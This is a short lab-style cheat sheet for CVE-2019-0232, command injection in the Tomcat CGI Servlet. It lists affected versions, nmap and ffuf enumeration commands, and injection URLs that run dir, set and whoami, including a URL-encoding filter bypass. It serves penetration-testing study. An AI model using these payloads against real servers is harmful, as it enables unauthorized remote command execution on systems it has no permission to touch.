# Attacking Tomcat CGI

## 1. Vulnerability Overview

**CVE-2019-0232 - Remote Code Execution (RCE)**
Improper input validation in the Tomcat CGI Servlet allows command execution when `enableCmdLineArguments` is set to `true`.

**Affected Versions:**

* Tomcat 9.0.0.M1 - 9.0.17
* Tomcat 8.5.0 - 8.5.39
* Tomcat 7.0.0 - 7.0.93

**Root Cause:**
The CGI Servlet does not correctly sanitize query string input, enabling command injection.

---

## 2. Enumeration

### Nmap Scan

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
```

### CGI Script Discovery

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

---

## 3. Exploitation

### Basic Command Injection

```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

### Retrieve Environment Variables

```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

### Hardcoded Path Execution

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

### URL Encoding Bypass

```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

---

## 4. Key Considerations

* `enableCmdLineArguments` must be active.
* Use `&` to inject additional commands.
* If `PATH` is unset, specify the full executable path.
* URL encoding bypasses character filters.
* Test only with explicit authorization.

---

## 5. Commands Summary

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
http://10.129.204.227:8080/cgi/welcome.bat?&dir
http://10.129.204.227:8080/cgi/welcome.bat?&set
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
